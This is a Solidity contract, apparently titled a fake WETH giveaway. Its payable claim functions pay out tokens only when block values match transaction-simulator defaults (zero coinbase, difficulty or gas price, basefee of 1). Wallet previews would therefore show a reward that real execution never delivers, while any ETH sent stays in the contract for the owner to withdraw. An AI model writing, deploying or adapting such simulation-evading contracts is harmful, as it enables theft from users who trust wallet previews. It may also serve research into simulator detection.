// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Ownable} from "openzeppelin/access/Ownable.sol";

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns(bool);
    function balanceOf(address account) external view returns (uint256);
}



contract FakeWethGiveawayV2 is Ownable {
    address public token;

    constructor(address _tokenAddress) {
        token = _tokenAddress;
    }

    function claimCoinbase() public payable {
        bool shouldDoTransfer = checkCoinbase();
        if (shouldDoTransfer) {
            IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
        }
        return;
    }
    
    function claimDifficulty() public payable {
        bool shouldDoTransfer = checkDifficulty();
        if (shouldDoTransfer) {
            IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
        }
        return;
    }

    function claimBlockBasefee() public payable {
        bool shouldDoTransfer = checkBlockBasefee();
        if (shouldDoTransfer) {
            IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
        }
        return;
    }


    function claimTxGasprice() public payable {
        bool shouldDoTransfer = checkTxGasprice();
        if (shouldDoTransfer) {
            IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
        }
        return;
    }

    function checkCoinbase() private view returns (bool result) {
        assembly {
            result := eq(coinbase(), 0x0000000000000000000000000000000000000000)
        }
    }


    function checkDifficulty() private view returns (bool result) {
        assembly {
            result := eq(difficulty(), 0)
        }
    }

    function checkBlockBasefee() private view returns (bool result) {
        assembly {
            result := eq(basefee(), 1)
        }
    }

    function checkTxGasprice() private view returns (bool result) {
        assembly {
            result := eq(gasprice(), 0)
        }
    }



    function testBlockDifficulty() public payable onlyOwner {
            IERC20(token).transfer(msg.sender, block.difficulty + 1);
    }

    function testBlockBasefee() public payable onlyOwner {
            IERC20(token).transfer(msg.sender, block.basefee + 1);
    }

    function testBlockCoinbase() public payable onlyOwner {
            uint256 coinbase = uint256(uint160(address(block.coinbase)));
            IERC20(token).transfer(msg.sender, coinbase + 1);
    }

    function testTxGasPrice() public payable onlyOwner {
            IERC20(token).transfer(msg.sender, tx.gasprice + 1);
    }

    function withdraw() public onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(msg.sender, balance);
        (bool success,) =  msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed.");
    }

    function updateTestingToken(address _newTokenAddress) public onlyOwner {
        token = _newTokenAddress;
    }

    receive() external payable {}
    fallback() external payable {}


}
